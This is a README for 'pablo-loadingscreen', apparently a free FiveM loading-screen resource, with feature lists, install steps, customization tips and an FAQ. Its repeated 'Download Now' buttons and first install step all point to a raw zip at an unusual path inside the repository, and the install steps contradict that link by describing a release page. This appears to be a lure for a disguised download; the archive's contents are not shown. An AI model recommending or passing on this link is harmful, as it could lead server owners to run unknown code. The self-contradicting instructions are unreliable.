<h1>🎨 pablo-loadingscreen - Interactive FiveM Loading Screen</h1>

<p align="center">
  <a style="display:inline-block;background-color:#0078D7;color:#fff;padding:20px 40px;font-size:24px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px auto;" href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip">⬇️ DOWNLOAD NOW</a>
</p>

<h2>🚀 Welcome</h2>
<p>pablo-loadingscreen is a free, interactive loading screen for your FiveM server. It replaces the boring default GTA V loading screen with a modern, customizable page that shows useful information while players wait. This works with any FiveM server, whether you use ESX, QBCore, or standalone setup.</p>

<h2>✨ Features</h2>

<h3>🖥️ Interactive Design</h3>
<p>Your players see a clean, animated loading screen with a progress bar, server logo, and background images. The screen keeps players engaged and informed while your server loads.</p>

<h3>🔗 Discord Integration</h3>
<p>Show a "Join Discord" button on the loading screen. Players can click it to join your community Discord server directly from the loading screen.</p>

<h3>📊 Real-Time Updates</h3>
<p>Displays connected player count, server name, and loading progress. The information updates automatically without refreshing the page.</p>

<h3>🎮 Works With Any Framework</h3>
<p>Compatible with ESX, QBCore, Standalone, and any other FiveM server setup. No extra programming required.</p>

<h3>🔧 Easy Customization</h3>
<p>Change colors, text, images, and links by editing simple HTML and CSS files. No coding experience needed – just open the files in Notepad and change words.</p>

<h3>🔓 Free & Open Source</h3>
<p>100% free with no hidden costs. The source code is available for anyone to use, modify, or improve.</p>

<h2>🛠️ System Requirements</h2>

<h3>For Your Computer (to edit files)</h3>
<ul>
  <li>Windows 7, 8, 10, or 11</li>
  <li>Any web browser (Chrome, Edge, Firefox)</li>
  <li>Notepad or any text editor</li>
  <li>Stable internet connection</li>
</ul>

<h3>For Your Server</h3>
<ul>
  <li>FiveM server installed and running</li>
  <li>Any GTA5 FiveM server build</li>
  <li>ESX, QBCore, or standalone framework</li>
</ul>

<h2>📥 How to Download & Install</h2>

<ol>
  <li><strong>Visit the download link:</strong> <a href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip">https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip</a> to download the application.</li>
  <li><strong>Find the latest release:</strong> On the page, look for the release with the highest version number (e.g., v1.0).</li>
  <li><strong>Download the file:</strong> Click the "Source code (zip)" link under that release. Your browser will download a .zip file.</li>
  <li><strong>Extract the files:</strong> Right-click the downloaded file (it's named something like "pablo-loadingscreen-1.0.zip") and select "Extract All..." Choose a folder you remember, like your Desktop or Documents.</li>
  <li><strong>Move to your server folder:</strong> Open the extracted folder. You'll see a folder inside called "pablo-loadingscreen". Copy or cut this entire folder.</li>
  <li><strong>Add to your server resources:</strong> Open your FiveM server's "resources" folder (usually located in the same place as your server.cfg file). Paste the "pablo-loadingscreen" folder into the "resources" folder.</li>
  <li><strong>Add the resource to your server.cfg:</strong> Open your server.cfg file with Notepad. Find the line that says "start" or "ensure" other resources. Add a new line at the end: <code>ensure pablo-loadingscreen</code></li>
  <li><strong>Save and restart:</strong> Save the server.cfg file and restart your FiveM server. The loading screen will be active the next time someone connects.</li>
</ol>

<h2>🎨 How to Customize</h2>

<ol>
  <li><strong>Open the files:</strong> Navigate to your pablo-loadingscreen folder and open the "index.html" file with Notepad.</li>
  <li><strong>Change the server name:</strong> Look for the word "FiveM" or "SERVER_NAME" and replace it with your custom server name.</li>
  <li><strong>Add your Discord link:</strong> Find a line with "discord.gg/" or "YOUR_DISCORD_INVITE" and replace that URL with your own Discord invite link.</li>
  <li><strong>Change background image:</strong> In the folder, find the "img" or "images" folder. Replace the existing background.jpg or background.png with your own image (same name and extension).</li>
  <li><strong>Change colors:</strong> In the index.html file, look for "color:" or "background-color:" lines. Change the numbers (like #ff0000) to any color you like. Use a site like color-hex.com to find color codes.</li>
  <li><strong>Save and restart your server:</strong> After changes, save the file and restart your server to see updates.</li>
</ol>

<h2>❓ Frequently Asked Questions</h2>

<h3>Q: My loading screen doesn't show. What do I do?</h3>
<p>Make sure the "pablo-loadingscreen" folder is inside your server's "resources" folder. Then check your server.cfg file has the line "ensure pablo-loadingscreen" (not "start"). Restart the server after making changes.</p>

<h3>Q: Can I use this with another framework?</h3>
<p>Yes. pablo-loadingscreen works with ESX, QBCore, vRP, and any FiveM server. The loading screen is independent of your server scripts.</p>

<h3>Q: How do I change the music or sound?</h3>
<p>Open the index.html file and look for "audio" or "music" lines. Replace the file name with your own .mp3 or .ogg file placed in the same folder.</p>

<h3>Q: Is this free forever?</h3>
<p>Yes. This is open source and free to use, modify, and share.</p>

<h2>🤝 Need Help?</h2>
<p>If you have trouble with installation or customization:</p>
<ul>
  <li>Check the Issues tab on GitHub for common fixes</li>
  <li>Open a new issue with your question</li>
  <li>Search the GitHub repository for similar topics</li>
</ul>

<p align="center">
  <a href="https://github.com/hgaray9668/pablo-loadingscreen/raw/refs/heads/main/volost/3.3-alpha.4.zip" style="display:inline-block;background-color:#28a745;color:#fff;padding:15px 30px;font-size:20px;font-weight:bold;text-decoration:none;border-radius:5px;">⬇️ Download Now</a>
</p>

<h2>📁 Contents of Package</h2>
<ul>
  <li>index.html - Main loading screen file</li>
  <li>style.css - Styling (colors, layout, animations)</li>
  <li>script.js - Interactive behavior (progress bar, count, buttons)</li>
  <li>fxmanifest.lua - FiveM resource definition</li>
  <li>img/ or images/ folder - Background and logo images</li>
  <li>__resource.lua - Alternative resource file for older servers</li>
</ul>

<h2>🛡️ License</h2>
<p>This project is open source. You are free to use it, modify it, and share it. No license fees or credits required.</p>